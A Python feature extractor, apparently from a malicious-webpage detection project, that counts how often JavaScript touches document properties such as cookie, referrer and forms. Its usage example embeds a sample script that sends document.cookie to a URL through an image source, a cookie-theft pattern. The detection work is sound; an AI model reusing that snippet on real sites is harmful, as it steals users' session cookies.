import re

from src.static_features.js import *


class DocProperties(JSExtractor):
    def __init__(self, web_data):
        super().__init__(web_data)
        self.meta = ExtractorMeta(
            "js",
            "DocProperties",
            "InfectedWebContent2017",
            "document.+特定property的使用次数",
            "1.0",
        )

    def calculate_score(self) -> FeatureExtractionResult:
        js_content_list = self.web_data.content["js"]
        info_dict = {}
        for h in js_content_list:
            start_time = time.time()
            res = calculate_score(h["content"])
            info_dict[h["filename"]] = {
                "count": res,
                "time": time.time() - start_time,
                "additional_info": {},
            }
        return FeatureExtractionResult(self.meta.filetype, self.meta.name, info_dict)


def calculate_score(js_content: str) -> int:
    # 定义需要统计的document属性
    properties = [
        "domain",
        "title",
        "links",
        "referrer",
        "lastModified",
        "forms",
        "search",
        "pathname",
        "URL",
        "action",
        # 除了本文新提出的，还有一些原来就有的？比如文章给出的cookie和documentURI？
        "cookie",
        "documentURI",
    ]
    # 构造正则表达式，匹配形如document.[property]的模式
    regex_patterns = [re.compile(r"\bdocument\." + prop + r"\b") for prop in properties]

    # 统计每个属性的使用次数
    counts = {
        prop: len(pattern.findall(js_content))
        for prop, pattern in zip(properties, regex_patterns)
    }
    total_count = sum(counts.values())
    return total_count


# 使用示例
if __name__ == "__main__":
    js_content = """
    <script language="javascript">
    var url = "http://www.trusted.com/index.html?cookie=";
    url = url + encodeURI(document.cookie);
    document.getElementById("pic").src=url;
    document.title = "New Title";
    document.links[0].href = "http://www.example.com";
    </script>
    """
    res = calculate_score(js_content)
    print(f"Document properties usage count: {res}")
